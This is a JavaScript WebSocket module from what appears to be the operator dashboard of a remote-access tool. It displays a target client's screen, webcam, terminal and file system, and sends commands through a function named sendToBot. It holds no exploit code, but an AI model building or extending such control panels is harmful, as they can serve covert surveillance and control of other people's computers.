// frontend/client_control/js/modules/websocket/connection.js
import { AppState } from '../core/states.js';
import { decodePacket, encodePacket } from '../../../../dashboard/js/modules/websocket/protocol.js';
import { renderScreenRGBA } from '../features/screen_renderer.js';

let socket = null;
const decoder = new TextDecoder();
const $ = id => document.getElementById(id);

// Обновление текстового содержимого элемента
const updateUI = (id, val) => {
  const el = $(id);
  el && (el.textContent = val ?? '...');
};

// Переключение визуального статуса подключения
const setOnline = (isOnline) => {
  const el = $('status-indicator');
  el?.classList.toggle('online', isOnline);
  el?.classList.toggle('offline', !isOnline);
  updateUI('status-text', isOnline ? 'online' : 'offline');
};

// Безопасный парсинг JSON из бинарного буфера
const parsePayload = (p) => {
  try { return JSON.parse(decoder.decode(p)); } 
  catch { return null; }
};

// Маршрутизация входящих пакетов по модулям системы
const handleIncomingData = (buffer) => {
  const pkg = decodePacket(buffer);
  if (!pkg) return;

  const { module, payload } = pkg;
  const { clientId } = AppState;

  if (module === 'DataScribe') {
    const raw = parsePayload(payload);
    if (!raw) return;
    const data = Array.isArray(raw) ? raw.find(c => c.id === clientId) : (raw[clientId] || raw);
    if (data) {
      data.ip && updateUI('display-ip', data.ip);
      data.id && updateUI('display-id', data.id);
      setOnline(data.status === 'online');
    }
  } 
  else if (module === 'ScreenWatch') payload.byteLength > 200 && renderScreenRGBA(payload);
  else if (module === 'Webcam') window.renderWebcam?.(payload);
  else if (module === 'Terminal') {
    const json = parsePayload(payload);
    const detail = json || { status: 'stream', data: decoder.decode(payload) };
    window.dispatchEvent(new CustomEvent('terminalOutput', { detail }));
  } 
  else if (module === 'FileManager') {
    const json = parsePayload(payload);
    json && window.renderFileSystem?.(json);
  }
  else if (module === 'FileManager_Stream') {
    window.dispatchEvent(new CustomEvent('FileManager_Stream', { detail: payload }));
  }
  else window.dispatchEvent(new CustomEvent('binaryDataReceived', { detail: pkg }));
};

// Инициализация WebSocket-соединения для управления клиентом
export const initControlConnection = () => {
  const { clientId: targetId } = AppState;
  const token = localStorage.getItem('auth_token');
  const login = localStorage.getItem('user_login');

  if (!token || !login || !targetId) return;

  const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
  const url = `${proto}//${location.host}/ws?token=${token}&login=${login}&mode=control&target=${encodeURIComponent(targetId)}`;

  socket = new WebSocket(url);
  socket.binaryType = 'arraybuffer';
  socket.onmessage = (e) => handleIncomingData(e.data);
  socket.onclose = () => setOnline(false);

  window.sendToBot = (mod, pay) => {
    if (socket?.readyState !== 1) return;
    
    const isRaw = pay instanceof Uint8Array || typeof pay === 'string';
    const data = isRaw ? pay : JSON.stringify(pay);
    socket.send(encodePacket(targetId, mod, data));
  };
};